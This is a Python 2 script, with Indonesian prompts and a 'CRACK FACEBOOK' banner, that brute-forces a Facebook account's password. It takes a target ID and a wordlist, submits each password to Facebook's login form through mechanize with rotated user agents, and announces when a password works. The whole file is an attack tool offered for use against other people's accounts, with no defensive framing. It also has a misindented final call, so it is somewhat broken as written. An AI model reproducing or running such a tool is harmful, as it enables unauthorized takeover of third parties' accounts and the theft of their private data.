# brute-fb
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
	
	
import os
import sys
import mechanize
import cookielib
import random 
import time

os.system('clear')

def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

if sys.platform == "linux" or sys.platform == "linux2":
     GL = "\033[96;1m" # Blue aqua
     BB = "\033[34;1m" # Blue light
     YY = "\033[33;1m" # Yellow light
     GG = "\033[32;1m" # Green light
     WW = "\033[0;1m"  # White light
     RR = "\033[31;1m" # Red light
     CC = "\033[36;1m" # Cyan light
     B = "\033[34m"    # Blue
     Y = "\033[33;1m"    # Yellow
     G = "\033[32m"    # Green
     W = "\033[0;1m"     # White
     R = "\033[31m"    # Red
     C = "\033[36;1m"    # Cyan
     rand = (BB,YY,GG,WW,RR,CC)
     P = random.choice(rand)
def cover():
    print """
    
    
    
    
     """
    runntek(GL+"           Assalamu'@laikum Kawan. ^_^...")
    time.sleep(1)
    print " "
    print RR+"  +============================================+"
    print GG+"  |••••••••   CRACK FACEBOOK BRO ^_^   •••••••••|" 
    print RR+"  +============================================+"
    print WW+"  |                 MOD BY: F4dl               |"
    print GG+"  |       Berdoa Dan Tetap Bersabar Bro :)     |"
    print WW+"  |--------------------------------------------|"
    print GL+"  |         SEMOGA HARI MU MENYENANGKAN        |"
    print WW+"  |--------------------------------------------|"
    print RR+"  +============================================+"
    print GG+"  |••••••••   CRACK FACEBOOK BRO ^_^  •••••••••|"
    print RR+"  +============================================+"     


cover()

email = str(raw_input(GL+" •Masukkan ID Target\033[33;1m: "))

passwordlist = str(raw_input(WW+" •Masukkan File Wordlist \033[95m[ pass.txt ] \033[92;1m: "))


#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]


def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        welcome()
        search()
        print " "
        runntek(RR+"  Wordlis Tidak Ada yang Cocok")
        runntek(RR+"  Kembangin Wordlistnya Sendiri Cuk")
        time.sleep(1)
        print WW+34*"  -"
        kol()

def kol():
    nok = raw_input("Edit wordlist Bro? \033[96;1m[y/n]: ")
    if nok == "y":
        print ("Silahkan tulis perintah \033[92;1m[ nano pass.txt ] !")
        print WW+(41*"-")
        print GL+(" ")
        os.sys.exit()
    else:
        exit(0)
def brute(password):
        sys.stdout.write(GG+"\r[+]\033[97;1m Mencoba ..... {}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print("\033[92;1m\n\n[+]\033[97;1m Password Find \033[31;1m===| \033[96;1m{}".format(password)) 
                        print " "
                        raw_input(WW+"TEKAN ENTER UNTUK KELUAR.....")
                        sys.exit(1)


def search():
        global password
        passwords = open(passwordlist,"r")
        for password in passwords:
                passwords = password.replace("\n","")
                brute(password)


#welcome
def welcome():
        wel = GG+"""
d88888b   j88D  d8888b. db      
88'      j8~88  88  `8D 88      
88ooo   j8' 88  88   88 88      
88~~~   V88888D 88   88 88      
88          88  88  .8D 88booo. 
YP          VP  Y8888D' Y88888P 
                                
                                 \033[96;4mSemoga Hari Mu Menyenangkan\033[92;1m"
      """
        print wel
        print " "
        total = open(passwordlist,"r")
        total = total.readlines()
        print " "
        print GL+" [*] Account to crack : {}".format(email)
        print RR+" [*] Jmlah :" , len(total),WW+ "passwords"
        print Y+" [*] Cracking, please wait .....\n\n"

if __name__ == '__main__':
main()
